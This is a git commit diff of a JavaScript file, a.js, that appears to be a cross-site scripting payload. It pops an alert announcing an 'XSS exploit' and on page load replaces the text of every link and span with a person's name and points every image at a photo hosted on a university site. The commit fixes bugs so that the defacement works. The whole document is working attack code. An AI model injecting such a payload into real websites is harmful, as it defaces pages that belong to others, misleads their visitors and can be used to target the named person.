3213239589719abf475886bf4688bf1fb46fa9d9
k018c1077 <46696419+k018c1077@users.noreply.github.com>
2020-06-16 20:58:48 +0900

    Update a.js

--- a.js
+++ a.js
@@ -1,11 +1,15 @@
 alert('XSS exploit has been Attacked!');
 window.onload = () => {
-  const a = document.getElementsByTagName('a')
-  a.forEach(ele => {
-    eleinnerText = '日野原龍一'
+  let a = document.getElementsByTagName('a')
+  Array.prototype.slice.call(a).forEach(ele => {
+    ele.innerHTML = '日野原龍一'
   });
-  const img = document.getElementsByTagName('img')
-  img.forEach(ele => {
+  let span = document.getElementsByTagName('span')
+  Array.prototype.slice.call(span).forEach(ele => {
+    ele.innerHTML = '日野原龍一'
+  });
+  let img = document.getElementsByTagName('img')
+  Array.prototype.slice.call(img).forEach(ele => {
     ele.src = 'http://hbs.ws.hosei.ac.jp/wp-content/uploads/2014/11/SusumagoNUS-180x192.jpg'
   })
-})
+}
